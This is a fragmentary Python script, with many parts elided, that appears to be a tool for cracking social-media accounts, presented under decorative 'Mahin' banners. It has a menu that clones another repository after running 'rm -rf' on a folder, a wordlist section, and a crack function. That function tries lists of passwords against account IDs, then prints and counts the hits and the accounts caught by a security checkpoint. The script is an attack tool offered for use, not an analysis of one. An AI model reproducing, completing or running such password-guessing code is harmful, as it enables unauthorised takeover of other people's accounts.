...
░ ░         ░           ░  ░
░                           
\033[41m\033[1;37m[𝓜𝓪𝓱𝓲𝓷]   [V-ViruX]   [I]   [X]\x1b[0m
\033[1;32m┌───────────────────────────────────────┐
\033[1;33m [✓] Owner: \033[1;32m[𝓜𝓪𝓱𝓲𝓷]       
\033[1;34m [✓] GITHUB :\033[1;37mArafat-Mahin310                                   
\033[1;35m [✓] CrA : Continue run bro                                                     
└───────────────────────────────────────┘  
    \033[41m\033[1;37m𝐓𝐎𝐎𝐋 𝐀𝐃𝐌𝐈𝐍 [𝓜𝓪𝓱𝓲𝓷] [♥️] [🌟]\x1b[0m    """)
os.system('clear')
banner()
...
def login_lagi334():
	try:
		...
		print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Login Successful \n \x1b[1;91m\x1b[1;96m\x1b[1;92m Type \x1b[1;96mpython Mahin.py');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	if _____KAUSAR_____ in ['2']:
		...
		P()
	if _____KAUSAR_____ in ['-*']:
		os.system("play-audio Firsr_Follow_My_GitHub.mp3")
		os.system('rm -rf First_Dump')
		os.system('git clone https://github.com//First_Dump.git')
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'\x1b[1;91m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m❴\033[47m\033[1;30mMahin\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m●')
	...
	print(f"\x1b[1;91m [🌥️] \x1b[1;92mTODAY TIME        \x1b[1;91m➢ \x1b[1;92m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")
	...
	if woi in ['y','Y']:
		...
		print(f'\t \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Allah Hafiz {u} ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} Mahin {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \x1b[1;91mMAHIN_CP {idf} | {pw}{N}')     
				os.system("play-audio MAHIN_Luck_CP.mp3")
